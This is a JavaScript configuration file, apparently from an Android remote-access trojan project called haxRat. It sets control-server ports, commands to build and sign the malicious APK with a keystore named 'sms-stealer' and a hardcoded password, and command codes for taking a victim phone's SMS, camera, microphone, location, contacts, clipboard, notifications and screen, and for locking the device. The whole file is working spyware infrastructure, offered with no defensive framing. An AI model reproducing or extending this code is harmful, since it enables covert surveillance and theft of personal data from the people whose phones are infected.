const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Paths
exports.termux = '/data/data/com.termux/files/home';
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/haxRat.apk');

exports.termuxApkBuildPath = exports.termux + '/haxrat/build.apk';
exports.termuxApkSignedBuildPath = exports.termux + '/haxrat/haxRat.apk';

exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);

// apktool.jar removed, only apkeditor used for building
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
// Fixed patch path: smali/classes/com/...
exports.patchFilePath = path.join(exports.smaliPath, 'smali/classes/com/hax4us/haxrat/IOSocket.smali');

// Build command using apkeditor (no apktool)
exports.buildCommand = `apkeditor b -i "${exports.smaliPath}" -o "${exports.apkBuildPath}"`;

// Sign command using apksigner (sign.jar removed)
const keystorePath = path.join(__dirname, '../app/factory/', 'sms-stealer.keystore');
const keystorePassword = "sms-stealer";
const keyAlias = "sms-stealer";

exports.signCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.apkSignedBuildPath}" "${exports.apkBuildPath}"`;

// Termux commands: build with apkeditor, sign with apksigner
exports.termuxBuildCommand = `apkeditor b -i "${exports.smaliPath}" -o "${exports.termuxApkBuildPath}"`;
exports.termuxSignCommand = `apksigner sign --ks "${keystorePath}" --ks-key-alias ${keyAlias} --ks-pass pass:${keystorePassword} --out "${exports.termuxApkSignedBuildPath}" "${exports.termuxApkBuildPath}"`;

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    lockDevice: '0xLD',
    screenShot: '0xSS',
    screenRecord: '0xSR',
    rearCam: '0xRC',
    frontCam: '0xFC'
};

exports.logTypes = {
    error: { name: 'ERROR', color: 'red' },
    alert: { name: 'ALERT', color: 'amber' },
    success: { name: 'SUCCESS', color: 'limegreen' },
    info: { name: 'INFO', color: 'blue' }
};
